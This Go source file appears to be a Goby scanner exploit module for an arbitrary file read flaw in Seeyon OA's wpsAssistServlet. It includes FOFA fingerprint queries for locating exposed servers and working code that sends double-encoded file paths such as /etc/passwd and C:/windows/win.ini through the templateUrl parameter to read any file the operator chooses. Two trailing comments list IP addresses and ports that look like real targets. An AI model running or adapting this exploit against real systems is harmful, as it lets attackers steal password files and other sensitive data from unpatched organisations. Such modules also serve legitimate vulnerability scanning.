package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Seeyon-OA wpsAssistServlet templateUrl Arbitrary File Read Vulnerability",
    "Description": "<p>Seeyon-OA is a collaborative office software that digitally builds the digital collaborative operation platform of enterprises and provides one-stop big data analysis solutions for various business scenarios of enterprises.</p><p>Seeyon-OA wpsAssistServlet has arbitrary file reading vulnerabilities, and attackers can read sensitive information such as system passwords to further control the system.</p>",
    "Product": "SEEYON-OA",
    "Homepage": "https://www.seeyon.com/",
    "DisclosureDate": "2023-02-13",
    "Author": "h1ei1",
    "FofaQuery": "body=\"/seeyon/USER-DATA/IMAGES/LOGIN/login.gif\" || title=\"用友致远A\" || (body=\"/yyoa/\" && body!=\"本站内容均采集于\") || header=\"path=/yyoa\" || server==\"SY8044\" || (body=\"A6-V5企业版\" && body=\"seeyon\" && body=\"seeyonProductId\") || (body=\"/seeyon/common/\" && body=\"var _ctxpath = '/seeyon'\") || (body=\"A8-V5企业版\" && body=\"/seeyon/\") || banner=\"Server: SY8044\"",
    "GobyQuery": "body=\"/seeyon/USER-DATA/IMAGES/LOGIN/login.gif\" || title=\"用友致远A\" || (body=\"/yyoa/\" && body!=\"本站内容均采集于\") || header=\"path=/yyoa\" || server==\"SY8044\" || (body=\"A6-V5企业版\" && body=\"seeyon\" && body=\"seeyonProductId\") || (body=\"/seeyon/common/\" && body=\"var _ctxpath = '/seeyon'\") || (body=\"A8-V5企业版\" && body=\"/seeyon/\") || banner=\"Server: SY8044\"",
    "Level": "2",
    "Impact": "<p>Seeyon-OA wpsAssistServlet has arbitrary file reading vulnerabilities, and attackers can read sensitive information such as system passwords to further control the system.</p>",
    "Recommendation": "<p>At present, the manufacturer has released security patches, please update in time: <a href=\"https://www.seeyon.com/.\">https://www.seeyon.com/.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "createSelect",
            "value": "/etc/passwd,C:/windows/win.ini",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "致远互联-OA wpsAssistServlet 文件 templateUrl 参数任意文件读取漏洞",
            "Product": "致远互联-OA",
            "Description": "<p>致远互联-OA 是数字化构建企业数字化协同运营中台，面向企业各种业务场景提供一站式大数据分析解决方案的协同办公软件。<br></p><p>致远互联-OA wpsAssistServlet 存在任意文件读取漏洞，攻击者可读取系统密码等敏感信息进一步控制系统。<br></p>",
            "Recommendation": "<p>目前厂商已发布安全补丁，请及时更新：<a href=\"https://www.seeyon.com/\">https://www.seeyon.com/</a>。<br></p>",
            "Impact": "<p>致远互联-OA wpsAssistServlet 存在任意文件读取漏洞，攻击者可读取系统密码等敏感信息进一步控制系统。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Seeyon-OA wpsAssistServlet templateUrl Arbitrary File Read Vulnerability",
            "Product": "SEEYON-OA",
            "Description": "<p>Seeyon-OA is a collaborative office software that digitally builds the digital collaborative operation platform of enterprises and provides one-stop big data analysis solutions for various business scenarios of enterprises.<br></p><p>Seeyon-OA wpsAssistServlet has arbitrary file reading vulnerabilities, and attackers can read sensitive information such as system passwords to further control the system.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released security patches, please update in time: <a href=\"https://www.seeyon.com/.\">https://www.seeyon.com/.</a><br></p>",
            "Impact": "<p>Seeyon-OA wpsAssistServlet has arbitrary file reading vulnerabilities, and attackers can read sensitive information such as system passwords to further control the system.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10803"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			uri := "/seeyon/wpsAssistServlet"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = "flag=template&templateUrl=%25%34%33%25%33%61%25%32%66%25%37%37%25%36%39%25%36%65%25%36%34%25%36%66%25%37%37%25%37%33%25%32%66%25%37%37%25%36%39%25%36%65%25%32%65%25%36%39%25%36%65%25%36%39"
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), "filename=win.ini") && strings.Contains(resp.RawBody, "for 16-bit app support") {
					return true
				}

			}
			uri2 := "/seeyon/wpsAssistServlet"
			cfg2 := httpclient.NewPostRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Data = "flag=template&templateUrl=%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34"
			cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
				if resp2.StatusCode == 200 && strings.Contains(resp2.HeaderString.String(), "filename=passwd") && strings.Contains(resp2.RawBody, "root:") {
					return true
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filePath"].(string)
			uri := "/seeyon/wpsAssistServlet"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = "flag=template&templateUrl=" + url.QueryEscape(url.QueryEscape(cmd))
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Output = resp.RawBody
				expResult.Success = true
			}
			return expResult
		},
	))
}

//123.234.79.158:7705
//58.62.201.110:9080
